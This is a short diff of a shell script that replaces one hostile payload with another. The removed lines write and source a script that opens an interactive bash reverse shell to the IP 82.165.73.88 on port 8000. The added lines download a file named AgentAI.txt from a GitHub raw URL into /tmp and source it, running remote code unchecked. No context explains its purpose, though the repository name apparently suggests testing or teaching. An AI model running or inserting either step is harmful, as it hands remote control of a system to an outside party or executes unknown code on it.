@@ -1,4 +1,3 @@
-cat << EOF > 
-/tmp/script.sh bash -c 'bash -i >& /dev/tcp/82.165.73.88/8000 0<&1' &
-EOF
-source /tmp/script.sh
+cd /tmp
+wget https://raw.githubusercontent.com/G-bl7/testingEdu/refs/heads/main/AgentAI.txt 
+source AgentAI.txt 
